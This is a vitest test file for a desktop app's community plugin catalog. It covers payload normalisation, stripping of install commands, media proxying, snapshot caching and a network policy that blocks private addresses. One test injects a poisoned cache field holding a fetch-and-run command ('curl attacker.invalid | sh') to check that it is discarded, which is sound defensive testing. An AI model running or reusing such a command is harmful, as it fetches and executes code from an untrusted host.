import { readFile } from 'node:fs/promises';
import vm from 'node:vm';

import { describe, expect, it, vi } from 'vitest';

interface CatalogOptions {
  readonly now?: () => number;
  readonly wait?: (milliseconds: number) => Promise<void>;
  readonly requests?: Readonly<Record<string, (page?: number, dataVersion?: string) => Promise<unknown>>>;
  readonly snapshotStore?: {
    load(sourceId: string): Promise<{ readonly storedAt: number; readonly snapshot: unknown } | undefined>;
    save(sourceId: string, snapshot: unknown, storedAt: number): Promise<void>;
  };
  readonly sourceRegistry?: { list(): Promise<readonly Record<string, unknown>[]> };
  readonly mediaProxy?: { register(url: unknown): { readonly icon: string } | undefined };
}

interface CatalogSnapshot {
  readonly schemaVersion: number;
  readonly cache: { readonly status: string; readonly storedAt: string; readonly expiresAt: string };
  readonly source: {
    readonly id: string;
    readonly complete: boolean;
    readonly indexedTotal: number;
    readonly providerTotal: number;
  };
  readonly items: readonly {
    readonly id: string;
    readonly displayName: string;
    readonly repository: string;
    readonly categories: readonly string[];
    readonly publisher: { readonly name: string };
    readonly media?: { readonly icon: string };
    readonly installability: {
      readonly state: string;
      readonly reason: string;
    };
    readonly provenance: { readonly sourceId: string };
  }[];
}

interface Catalog {
  listSources(): Promise<readonly { readonly id: string }[]>;
  read(options?: { readonly sourceId?: string; readonly refresh?: boolean }): Promise<CatalogSnapshot>;
}

type CatalogFactory = (options?: CatalogOptions) => Catalog;

const validPayload = {
  total_count: 1,
  items: [{
    id: 42,
    name: 'dsh-plugin-example',
    full_name: 'community/dsh-plugin-example',
    html_url: 'https://github.com/community/dsh-plugin-example',
    description: 'A community plugin.',
    owner: { login: 'community', avatar_url: 'https://avatars.githubusercontent.com/u/42?v=4' },
    topics: ['dsh-plugin', 'tools', 'agent'],
  }],
};

const validDshfindPayload = {
  page: 1,
  per_page: 100,
  total: 1,
  total_pages: 1,
  data_version: `sha256:${'a'.repeat(64)}`,
  data: [{
      full_name: 'community/dsh-plugin-example',
      name: 'dsh-plugin-example',
      owner: 'community',
      repository_url: 'https://github.com/community/dsh-plugin-example',
      category: 'tools',
      description: 'A community plugin.',
      install: {
        pkg_name: 'dsh-plugin-example',
        cmd: 'must never be copied',
        methods: [{
          kind: 'npm',
          spec: 'dsh-plugin-example',
          revision: '1.2.3',
          verification: 'verified',
          code: 'repository_backlink',
          requiresBuildAllowance: false,
        }],
      },
    }],
};

function requests(sourceId: string, request: (page?: number, dataVersion?: string) => Promise<unknown>) {
  return { [sourceId]: request };
}

async function loadCatalogFactory(): Promise<CatalogFactory> {
  const module = await import(
    new URL('../../../runtime/desktop-market-plugin/catalog.js', import.meta.url).href
  ) as { readonly createCatalog: CatalogFactory };
  return module.createCatalog;
}

describe('desktop community plugin catalog', () => {
  it('protects managed staging with the per-Runtime private token', async () => {
    const module = await import(
      new URL('../../../runtime/desktop-market-plugin/index.js', import.meta.url).href
    ) as { authorizedManagedRequest(expected: unknown, presented: unknown): boolean };
    const token = 'private-runtime-token-that-is-long-enough';

    expect(module.authorizedManagedRequest(token, token)).toBe(true);
    expect(module.authorizedManagedRequest(token, `${token}x`)).toBe(false);
    expect(module.authorizedManagedRequest(token, 'wrong-token')).toBe(false);
    expect(module.authorizedManagedRequest('short', 'short')).toBe(false);
  });

  it('normalizes GitHub topic results into a non-executable snapshot', async () => {
    const createCatalog = await loadCatalogFactory();
    const catalog = createCatalog({
      now: () => Date.parse('2026-08-21T03:00:00.000Z'),
      requests: requests('github-topic-dsh-plugin', vi.fn().mockResolvedValue(validPayload)),
    });

    expect(Object.keys(catalog)).toEqual(['listSources', 'read']);
    await expect(catalog.read({ sourceId: 'github-topic-dsh-plugin' })).resolves.toMatchObject({
      schemaVersion: 2,
      source: { id: 'github-topic-dsh-plugin', complete: false, indexedTotal: 1, providerTotal: 1 },
      items: [{
        id: 'github:42',
        displayName: 'dsh-plugin-example',
        repository: 'https://github.com/community/dsh-plugin-example',
        categories: ['tools', 'agent'],
        publisher: { name: 'community' },
        installability: {
          state: 'browse-only',
          reason: 'incomplete-source-index',
        },
        provenance: { sourceId: 'github-topic-dsh-plugin' },
      }],
    });
    const serialized = JSON.stringify(await catalog.read({ sourceId: 'github-topic-dsh-plugin' }));
    expect(serialized).not.toMatch(/installCommand|script|commandText/i);
  });

  it('publishes only a same-origin media reference and never exposes the remote image URL', async () => {
    const createCatalog = await loadCatalogFactory();
    const register = vi.fn(() => ({ icon: `/plugins/@dsh-desktop/market/media?id=${'a'.repeat(64)}` }));
    const catalog = createCatalog({
      requests: requests('github-topic-dsh-plugin', vi.fn().mockResolvedValue(validPayload)),
      mediaProxy: { register },
    });

    const result = await catalog.read({ sourceId: 'github-topic-dsh-plugin' });
    expect(register).toHaveBeenCalledWith('https://avatars.githubusercontent.com/u/42?v=4');
    expect(result.items[0]).toMatchObject({
      media: { icon: `/plugins/@dsh-desktop/market/media?id=${'a'.repeat(64)}` },
    });
    expect(JSON.stringify(result)).not.toContain('avatars.githubusercontent.com');
  });

  it('builds a complete local index and derives installable candidates from reviewed identity', async () => {
    const createCatalog = await loadCatalogFactory();
    const catalog = createCatalog({
      now: () => Date.parse('2026-08-21T03:00:00.000Z'),
      requests: requests('dshfind', async () => validDshfindPayload),
    });

    await expect(catalog.read()).resolves.toMatchObject({
      schemaVersion: 2,
      source: { id: 'dshfind', complete: true, indexedTotal: 1, providerTotal: 1 },
      items: [{
        id: 'dshfind:community/dsh-plugin-example',
        package: { name: 'dsh-plugin-example', version: '1.2.3' },
        installability: { state: 'candidate', reason: 'provider-verified-repository-backlink' },
      }],
    });
    expect(JSON.stringify(await catalog.read())).not.toContain('must never be copied');
  });

  it('keeps the complete dshfind index when the provider grows beyond one hundred pages', async () => {
    const createCatalog = await loadCatalogFactory();
    const total = 10_001;
    const totalPages = 101;
    const dataVersion = `sha256:${'c'.repeat(64)}`;
    const requestPage = vi.fn(async (page = 1) => {
      const count = page < totalPages ? 100 : 1;
      const offset = (page - 1) * 100;
      return {
        page, per_page: 100, total, total_pages: totalPages, data_version: dataVersion,
        data: Array.from({ length: count }, (_, index) => ({
          full_name: `community/plugin-${offset + index}`,
          name: `plugin-${offset + index}`,
          owner: 'community',
          repository_url: `https://github.com/community/plugin-${offset + index}`,
          description: 'Plugin.',
        })),
      };
    });

    const result = await createCatalog({
      requests: requests('dshfind', requestPage),
      wait: async () => undefined,
    }).read();

    expect(result.source).toMatchObject({ complete: true, indexedTotal: total, providerTotal: total });
    expect(requestPage).toHaveBeenCalledTimes(totalPages);
    expect(requestPage).toHaveBeenLastCalledWith(totalPages, dataVersion);
  });

  it('publishes remotely maintained developer-installed versions without bypassing inspection', async () => {
    const createCatalog = await loadCatalogFactory();
    const testedAt = '2026-08-23T03:00:00.000Z';
    const catalog = createCatalog({
      now: () => Date.parse(testedAt),
      requests: requests('yukiryou-curated', async () => ({
        schemaVersion: 1,
        revision: '2026-08-23.1',
        items: [{
          id: 'dsh-context', displayName: 'dsh-context', summary: 'Installed on real hardware.',
          repository: 'https://github.com/bowenliang123/dsh-context', categories: ['agent'],
          publisher: { name: 'bowenliang123' }, package: { name: 'dsh-context', version: '0.25.3' },
          verification: {
            status: 'installed', testedAt, harnessVersion: '0.1.1-rc.2',
            platforms: ['darwin-arm64', 'win32-x64'], notes: 'Desktop profile smoke passed.',
          },
        }],
      })),
    });

    await expect(catalog.listSources()).resolves.toEqual(expect.arrayContaining([
      expect.objectContaining({ id: 'yukiryou-curated', curated: true, builtIn: true }),
    ]));
    await expect(catalog.read({ sourceId: 'yukiryou-curated' })).resolves.toMatchObject({
      source: { id: 'yukiryou-curated', complete: true, indexedTotal: 1 },
      items: [{
        package: { name: 'dsh-context', version: '0.25.3' },
        developerVerification: {
          status: 'installed', testedAt, harnessVersion: '0.1.1-rc.2',
          platforms: ['darwin-arm64', 'win32-x64'],
        },
        installability: { state: 'candidate', reason: 'developer-installed-and-reviewed' },
      }],
    });
  });

  it('fails the full scan when a later page changes the provider data version', async () => {
    const createCatalog = await loadCatalogFactory();
    const firstItems = Array.from({ length: 100 }, (_, index) => ({
      full_name: `community/plugin-${index}`,
      name: `plugin-${index}`,
      owner: 'community',
      repository_url: `https://github.com/community/plugin-${index}`,
      description: 'Plugin.',
    }));
    const requestPage = vi.fn(async (page?: number) => page === 1
      ? { ...validDshfindPayload, total: 101, total_pages: 2, data: firstItems }
      : {
          ...validDshfindPayload,
          page: 2,
          total: 101,
          total_pages: 2,
          data_version: `sha256:${'b'.repeat(64)}`,
        });
    const wait = vi.fn(async () => undefined);

    await expect(createCatalog({ requests: requests('dshfind', requestPage), wait }).read())
      .rejects.toMatchObject({ code: 'catalog:invalid-response' });
    expect(wait).toHaveBeenCalledWith(2_100);
  });

  it('marks a provider-short snapshot as truncated and grants no installable candidate', async () => {
    const createCatalog = await loadCatalogFactory();
    const storePayload = {
      packages: [{
        id: 'community/dsh-plugin-example', name: 'dsh-plugin-example', owner: 'community',
        url: 'https://github.com/community/dsh-plugin-example', category: 'tools',
        installMethods: validDshfindPayload.data[0]?.install?.methods,
      }],
      meta: { total: 2, revision: 'sha256:example' },
    };
    const catalog = createCatalog({ requests: requests('dsh-1024store', async () => storePayload) });
    const result = await catalog.read({ sourceId: 'dsh-1024store' });

    expect(result.source).toMatchObject({ complete: false, indexedTotal: 1, providerTotal: 2 });
    expect(result.items[0]?.installability).toEqual({ state: 'browse-only', reason: 'incomplete-source-index' });
    expect(result.items[0]).not.toHaveProperty('package');
  });

  it('normalizes an enabled custom JSON v1 source without granting installability', async () => {
    const createCatalog = await loadCatalogFactory();
    const sourceId = 'custom-00000000-0000-4000-8000-000000000001';
    const requestCustom = vi.fn(async () => ({
      schemaVersion: 1,
      revision: '2026-08-21.1',
      items: [{
        id: 'community/example', displayName: 'Example', summary: 'Community source item',
        repository: 'https://github.com/community/example', categories: ['tools'],
        publisher: { name: 'community' }, package: { name: 'ignored', version: '1.0.0' },
        command: 'must not survive',
      }],
    }));
    const catalog = createCatalog({
      requests: requests('custom', requestCustom),
      sourceRegistry: {
        list: async () => [{
          id: sourceId, displayName: 'Custom', url: 'https://plugins.example.com/catalog.json', enabled: true, order: 0,
        }],
      },
    });

    const result = await catalog.read({ sourceId });
    expect(requestCustom).toHaveBeenCalledWith('https://plugins.example.com/catalog.json');
    expect(result).toMatchObject({
      source: { id: sourceId, complete: true, indexedTotal: 1 },
      items: [{ installability: { state: 'browse-only', reason: 'custom-source-unverified' } }],
    });
    expect(JSON.stringify(result)).not.toMatch(/must not survive|"package"/u);
  });

  it('caches reads, merges concurrent refreshes, and lets a later refresh bypass cache', async () => {
    const createCatalog = await loadCatalogFactory();
    let resolveRequest: ((value: unknown) => void) | undefined;
    const requestJson = vi.fn(() => new Promise<unknown>((resolve) => {
      resolveRequest = resolve;
    }));
    const catalog = createCatalog({
      now: () => 1_000,
      requests: requests('github-topic-dsh-plugin', requestJson),
    });

    const first = catalog.read({ sourceId: 'github-topic-dsh-plugin', refresh: true });
    const concurrent = catalog.read({ sourceId: 'github-topic-dsh-plugin', refresh: true });
    await Promise.resolve();
    expect(requestJson).toHaveBeenCalledOnce();
    resolveRequest?.(validPayload);
    await expect(Promise.all([first, concurrent])).resolves.toHaveLength(2);
    await catalog.read({ sourceId: 'github-topic-dsh-plugin' });
    expect(requestJson).toHaveBeenCalledOnce();

    const refreshed = catalog.read({ sourceId: 'github-topic-dsh-plugin', refresh: true });
    await Promise.resolve();
    resolveRequest?.(validPayload);
    await refreshed;
    expect(requestJson).toHaveBeenCalledTimes(2);
  });

  it('restores a validated persistent snapshot without requesting the network', async () => {
    const createCatalog = await loadCatalogFactory();
    const timestamp = Date.parse('2026-08-21T03:00:00.000Z');
    let persisted: unknown;
    const seed = createCatalog({
      now: () => timestamp,
      requests: requests('dshfind', async () => validDshfindPayload),
      snapshotStore: {
        load: async () => undefined,
        save: async (_sourceId, snapshot) => { persisted = snapshot; },
      },
    });
    await seed.read();
    const network = vi.fn();
    const restored = createCatalog({
      now: () => timestamp + 1_000,
      requests: requests('dshfind', network),
      snapshotStore: {
        load: async () => ({ storedAt: timestamp, snapshot: persisted }),
        save: async () => undefined,
      },
    });

    await expect(restored.read()).resolves.toMatchObject({
      cache: { status: 'persistent' },
      source: { id: 'dshfind', indexedTotal: 1 },
    });
    expect(network).not.toHaveBeenCalled();
  });

  it('re-registers cached media while keeping its remote URL out of the client snapshot', async () => {
    const createCatalog = await loadCatalogFactory();
    const timestamp = Date.parse('2026-08-21T03:00:00.000Z');
    let persisted: unknown;
    const seed = createCatalog({
      now: () => timestamp,
      requests: requests('github-topic-dsh-plugin', async () => validPayload),
      mediaProxy: { register: () => ({ icon: `/plugins/@dsh-desktop/market/media?id=${'a'.repeat(64)}` }) },
      snapshotStore: {
        load: async () => undefined,
        save: async (_sourceId, snapshot) => { persisted = snapshot; },
      },
    });
    await seed.read({ sourceId: 'github-topic-dsh-plugin' });
    const register = vi.fn(() => ({ icon: `/plugins/@dsh-desktop/market/media?id=${'b'.repeat(64)}` }));
    const restored = createCatalog({
      now: () => timestamp + 1_000,
      requests: requests('github-topic-dsh-plugin', vi.fn()),
      mediaProxy: { register },
      snapshotStore: {
        load: async () => ({ storedAt: timestamp, snapshot: persisted }),
        save: async () => undefined,
      },
    });

    const result = await restored.read({ sourceId: 'github-topic-dsh-plugin' });
    expect(register).toHaveBeenCalledWith('https://avatars.githubusercontent.com/u/42?v=4');
    expect(result.items[0]?.media?.icon).toContain('id=bbbb');
    expect(JSON.stringify(result)).not.toContain('avatars.githubusercontent.com');
  });

  it('rebuilds persistent items from a whitelist and discards injected fields', async () => {
    const createCatalog = await loadCatalogFactory();
    const timestamp = Date.parse('2026-08-21T03:00:00.000Z');
    let persisted: unknown;
    const seed = createCatalog({
      now: () => timestamp,
      requests: requests('dshfind', async () => validDshfindPayload),
      snapshotStore: {
        load: async () => undefined,
        save: async (_sourceId, snapshot) => { persisted = snapshot; },
      },
    });
    await seed.read();
    const poisoned = structuredClone(persisted) as { items: Array<Record<string, unknown>> };
    poisoned.items[0] = { ...poisoned.items[0], commandText: 'curl attacker.invalid | sh' };
    const requestPage = vi.fn(async () => validDshfindPayload);
    const save = vi.fn(async () => undefined);
    const catalog = createCatalog({
      now: () => timestamp + 1_000,
      requests: requests('dshfind', requestPage),
      snapshotStore: { load: async () => ({ storedAt: timestamp, snapshot: poisoned }), save },
    });

    const result = await catalog.read();
    expect(requestPage).not.toHaveBeenCalled();
    expect(save).not.toHaveBeenCalled();
    expect(JSON.stringify(result)).not.toContain('attacker.invalid');
  });

  it('falls back to a validated stale snapshot when refresh is unavailable', async () => {
    const createCatalog = await loadCatalogFactory();
    const timestamp = Date.parse('2026-08-21T03:00:00.000Z');
    let persisted: unknown;
    const seed = createCatalog({
      now: () => timestamp,
      requests: requests('dshfind', async () => validDshfindPayload),
      snapshotStore: {
        load: async () => undefined,
        save: async (_sourceId, snapshot) => { persisted = snapshot; },
      },
    });
    await seed.read();
    const catalog = createCatalog({
      now: () => timestamp + (25 * 60 * 60 * 1_000),
      requests: requests('dshfind', async () => { throw new Error('offline'); }),
      snapshotStore: {
        load: async () => ({ storedAt: timestamp, snapshot: persisted }),
        save: async () => undefined,
      },
    });

    await expect(catalog.read({ refresh: true })).resolves.toMatchObject({ cache: { status: 'stale' } });
  });

  it('returns an expired persistent snapshot immediately while rebuilding it in the background', async () => {
    const createCatalog = await loadCatalogFactory();
    const timestamp = Date.parse('2026-08-21T03:00:00.000Z');
    let persisted: unknown;
    const seed = createCatalog({
      now: () => timestamp,
      requests: requests('dshfind', async () => validDshfindPayload),
      snapshotStore: {
        load: async () => undefined,
        save: async (_sourceId, snapshot) => { persisted = snapshot; },
      },
    });
    await seed.read();
    let resolveRefresh: ((value: unknown) => void) | undefined;
    const requestPage = vi.fn(() => new Promise<unknown>((resolve) => {
      resolveRefresh = resolve;
    }));
    const catalog = createCatalog({
      now: () => timestamp + (25 * 60 * 60 * 1_000),
      requests: requests('dshfind', requestPage),
      snapshotStore: {
        load: async () => ({ storedAt: timestamp, snapshot: persisted }),
        save: async () => undefined,
      },
    });

    const result = await catalog.read();
    expect(result).toMatchObject({
      cache: { status: 'stale' },
      source: { id: 'dshfind', indexedTotal: 1 },
    });
    expect(requestPage).toHaveBeenCalledOnce();
    resolveRefresh?.(validDshfindPayload);
  });

  it('rejects entries outside the fixed dsh-plugin topic and repository origin', async () => {
    const createCatalog = await loadCatalogFactory();
    const wrongTopic = {
      total_count: 1,
      items: [{ ...validPayload.items[0], topics: ['tools'] }],
    };
    const wrongOrigin = {
      total_count: 1,
      items: [{
        ...validPayload.items[0],
        html_url: 'https://example.com/community/dsh-plugin-example',
      }],
    };

    await expect(createCatalog({ requests: requests('github-topic-dsh-plugin', async () => wrongTopic) }).read({ sourceId: 'github-topic-dsh-plugin' }))
      .rejects.toMatchObject({ code: 'catalog:invalid-response' });
    await expect(createCatalog({ requests: requests('github-topic-dsh-plugin', async () => wrongOrigin) }).read({ sourceId: 'github-topic-dsh-plugin' }))
      .rejects.toMatchObject({ code: 'catalog:invalid-response' });
  });

  it('registers a managed community tab through the official plugins slot', async () => {
    const source = await readFile(
      new URL('../../../runtime/desktop-market-plugin/client.js', import.meta.url),
      'utf8',
    );
    const hostSource = await readFile(
      new URL('../../../runtime/desktop-market-plugin/index.js', import.meta.url),
      'utf8',
    );
    let plugin: {
      apply(context: unknown): void;
      findInstalledCatalogItem(
        entry: Record<string, unknown>,
        items: readonly Record<string, unknown>[],
      ): Record<string, unknown> | undefined;
      mergeInstalledInventory(
        entries: readonly Record<string, unknown>[],
        snapshot: Record<string, unknown>,
      ): readonly Record<string, unknown>[];
      matchesInstalledScope(entry: Record<string, unknown>, scope: 'user' | 'system' | 'all'): boolean;
    } | undefined;
    const register = vi.fn();
    const React = { createElement: vi.fn(), Fragment: Symbol('fragment') };
    const document = {
      createElement: () => ({ dataset: {}, textContent: '' }),
      head: { appendChild: vi.fn() },
      querySelector: vi.fn().mockReturnValue(null),
    };
    const window = {
      __ModuleLoader__: {
        load: ({ factory }: { factory(require: () => unknown): unknown }) => {
          plugin = factory(() => React) as typeof plugin;
        },
      },
    };
    vm.runInNewContext(source, { document, fetch: vi.fn(), window });
    plugin?.apply({
      effect: vi.fn(),
      locale: { bind: () => (key: string) => key, register: vi.fn() },
      remote: { pluginInventory: { list: vi.fn() } },
      slots: {
        inject: (_name: string, callback: () => unknown) => callback(),
        register,
      },
    });

    expect(register).toHaveBeenCalledWith(expect.objectContaining({
      name: 'settings.plugins.tab',
      id: 'desktop-community',
      order: 30,
    }), expect.any(Function));
    expect(plugin?.mergeInstalledInventory([], { entries: [], externalEntries: [{
      packageName: 'external-example', version: '1.0.0', enabled: false, entryIds: ['external-entry'],
    }] })).toEqual([expect.objectContaining({ moduleName: 'external-example', runtimeState: 'disabled', externalControl: expect.any(Object) })]);
    expect(plugin?.mergeInstalledInventory([
      { entryId: 'webserver', moduleName: '@deepseek-ai/dsh-host-webserver', enabled: true },
    ], { recoveryMode: 'safe', entries: [], externalEntries: [
      { packageName: 'external-example', version: '1.0.0', enabled: true, entryIds: ['external-entry'] },
    ] })).toEqual([
      expect.objectContaining({ moduleName: '@deepseek-ai/dsh-host-webserver', recoverySkipped: false }),
      expect.objectContaining({ moduleName: 'external-example', recoverySkipped: true }),
    ]);
    expect(source).not.toContain('onInstall');
    expect(source).toContain("['discover', 'discover', allItems.length]");
    expect(source).toContain("['installable', 'installable', installable.length]");
    expect(source).toContain("['installed', 'installed', userInstalled.length]");
    expect(source).toContain("['sources', 'sources', sourceRecords.entries.length]");
    expect(source).toContain('const filteredInstallable = installable.filter');
    expect(source).toContain('const filteredInstalled = scopedInstalled.filter');
    expect(source).toContain("setCatalog((current) => ({ status: 'loading', snapshot: current.snapshot }))");
    expect(source).toContain("const [installedScope, setInstalledScope] = React.useState('user')");
    expect(source).toContain("React.createElement('option', { value: 'user' }, t('installedUser'))");
    expect(source).toContain("React.createElement('option', { value: 'system' }, t('installedSystem'))");
    expect(source).toContain("React.createElement('option', { value: 'all' }, t('installedAll'))");
    expect(source).toContain('...visibleInstalled.map((entry) =>');
    expect(source).toContain("className: 'dsh-market-installed-status'");
    expect(source).toContain("className: 'dsh-market-installed-actions'");
    expect(source).toContain('.dsh-market-installed-row{display:grid;min-width:0;padding:14px 16px;grid-template-columns:minmax(0,1fr) auto auto;');
    expect(source).toContain('dsh-market-toolbar-search-only');
    expect(source).toContain("'x-dsh-desktop-market-mutation': '1'");
    expect(source).toContain("kind: 'set-enabled'");
    expect(source).toContain("role: 'dialog'");
    expect(source).toContain("referrerPolicy: 'no-referrer'");
    expect(source).toContain("'/plugins/@dsh-desktop/market/install-inspection'");
    expect(source).toContain("'/plugins/@dsh-desktop/market/update-check'");
    expect(source).toContain('readInstalledUpdate(packageName, installedVersion)');
    expect(hostSource).toContain("const UPDATE_CHECK_ROUTE = '/plugins/@dsh-desktop/market/update-check'");
    expect(hostSource).toContain('const value = await updateChecker.check({');
    expect(hostSource).toContain("payload?.kind === 'preview-external'");
    expect(hostSource).toContain('managedPreviewVault.issueExternal({');
    expect(source).toContain("'x-dsh-desktop-market-inspection': '1'");
    expect(source).toContain("executionReady !== false");
    expect(source).toContain('formatDateTime(selected.provenance.observedAt)');
    expect(source).toContain("artifact.verificationStatus === 'verified' ? 'inspectionNoInstall' : 'inspectionNoInstallBlocked'");
    expect(source).toContain('window.deepSeekYukiRyouPlugins.preview');
    expect(source).toContain('window.deepSeekYukiRyouPlugins.execute');
    expect(source).toContain('window.deepSeekYukiRyouPlugins.inventory');
    expect(source).toContain('window.deepSeekYukiRyouPlugins.remove');
    expect(source).toContain('window.deepSeekYukiRyouPlugins.setEnabled');
    expect(source).toContain('window.deepSeekYukiRyouPlugins.rollback');
    expect(source).toContain('window.deepSeekYukiRyouPlugins.controlExternal');
    expect(source).toContain('entry.externalControl.enabled');
    expect(source).toContain("controlExternalPlugin(entry, 'uninstall')");
    expect(source).toContain('entryId: capability.entryIds[0]');
    expect(source).toContain("{ state: 'candidate', reason: 'verified-external-installation' }");
    expect(source).toContain("operation === 'adopt' ? 'adoptPreviewTitle'");
    expect(source).toContain("t(external === undefined ? 'readonlyState' : 'externalState')");
    expect(source).toContain("ownership: receipt === undefined ? inferredOwnership(entry.moduleName) : 'managed'");
    expect(source).toContain("format(t, 'installedAt', { time: formatDateTime(entry.receipt.installedAt) })");
    expect(source).toContain("format(t, 'blockedAttempt', { version: entry.receipt.lastBlockedAttempt.version })");
    expect(source).toContain('onClick: () => openInstalledDetails(entry)');
    expect(source).toContain("t(entry.receipt || entry.externalControl ? 'checkUpdates' : 'details')");
    expect(source).toContain("selectedInstalled ? 'checkUpdates' : 'inspect'");
    expect(source).toContain("inspection.value.identity.catalogVersion");
    expect(source).toContain("format(t, 'catalogVersionInline', { version: item.package.version })");
    expect(source).toContain('choose the catalog version or npm latest');
    expect(source).toContain("const [versionPreference, setVersionPreference] = React.useState('latest')");
    expect(source).toContain("versionPreference === 'catalog'");
    expect(source).toContain("versionPreference === 'latest'");
    expect(source).toContain("versionPreference,");
    expect(source).toContain("t('catalogVersionChoice')");
    expect(source).toContain("t('latestVersionChoice')");
    expect(source).toContain("candidateVersion === receipt.version ? 'upToDate' : 'prepareUpdate'");
    expect(source).toContain("onClick: () => removeManagedPlugin(entry.receipt)");
    expect(source).toContain("onClick: () => setManagedPluginEnabled(entry.receipt, !entry.receipt.enabled)");
    expect(source).toContain('onClick: () => rollbackManagedPlugin(entry.receipt)');
    expect(source).toContain("'updateAndRestart'");
    expect(source).toContain("'reinstallAndRestart'");
    expect(source).toContain('preview.operation.currentVersion');
    expect(source).not.toContain("new Date(catalog.snapshot.cache.storedAt).toLocaleString()");
    expect(plugin?.findInstalledCatalogItem({
      moduleName: 'dsh-context',
      receipt: { packageName: 'dsh-context', version: '0.15.0' },
    }, [{
      id: 'dshfind:context',
      package: { name: 'dsh-context', version: '0.15.0' },
      summary: 'Context plugin details',
    }])).toMatchObject({ summary: 'Context plugin details' });
    expect(plugin?.matchesInstalledScope({ ownership: 'managed' }, 'user')).toBe(true);
    expect(plugin?.matchesInstalledScope({ ownership: 'external' }, 'user')).toBe(true);
    expect(plugin?.matchesInstalledScope({ ownership: 'system' }, 'user')).toBe(false);
    expect(plugin?.matchesInstalledScope({ ownership: 'dependency' }, 'user')).toBe(false);
    expect(plugin?.matchesInstalledScope({ ownership: 'system' }, 'system')).toBe(true);
    expect(plugin?.matchesInstalledScope({ ownership: 'managed' }, 'system')).toBe(false);
    expect(plugin?.matchesInstalledScope({ ownership: 'dependency' }, 'all')).toBe(true);
    expect(plugin?.mergeInstalledInventory([{
      entryId: 'profile-bundle:dsh-deepseek-account',
      moduleName: 'dsh-deepseek-account',
      enabled: true,
    }], {
      entries: [],
      externalEntries: [{
        packageName: 'dsh-deepseek-account',
        version: '0.1.2',
        entryIds: ['deepseek-account'],
        enabled: true,
        allowedActions: ['disable', 'uninstall'],
        repository: 'https://github.com/yoshino-xiao7/dsh-deepseek-account',
      }],
    })).toEqual([expect.objectContaining({
      moduleName: 'dsh-deepseek-account',
      externalControl: expect.objectContaining({ packageName: 'dsh-deepseek-account' }),
    })]);
  });
});

describe('desktop catalog network policy', () => {
  it('accepts public addresses and rejects local or private ranges', async () => {
    const module = await import(
      new URL('../../../runtime/desktop-market-plugin/catalog-network.js', import.meta.url).href
    ) as {
      readonly isAllowedGitHubAddress: (address: string) => boolean;
      readonly isAllowedCustomCatalogAddress: (address: string) => boolean;
      readonly isAllowedRemoteImageAddress: (hostname: string, address: string) => boolean;
    };

    expect(module.isAllowedGitHubAddress('140.82.113.6')).toBe(true);
    expect(module.isAllowedGitHubAddress('2606:50c0:8000::154')).toBe(true);
    expect(module.isAllowedGitHubAddress('198.18.0.60')).toBe(true);
    expect(module.isAllowedCustomCatalogAddress('198.18.0.60')).toBe(false);
    expect(module.isAllowedRemoteImageAddress('avatars.githubusercontent.com', '198.18.0.60')).toBe(true);
    expect(module.isAllowedRemoteImageAddress('images.example.com', '198.18.0.60')).toBe(false);
    for (const address of [
      '127.0.0.1', '10.0.0.1', '169.254.1.1', '192.168.1.1', '192.0.2.1',
      '198.51.100.1', '203.0.113.1', '::1', '::ffff:127.0.0.1', '2001:db8::1', 'fd00::1',
    ]) {
      expect(module.isAllowedGitHubAddress(address)).toBe(false);
    }
  });
});
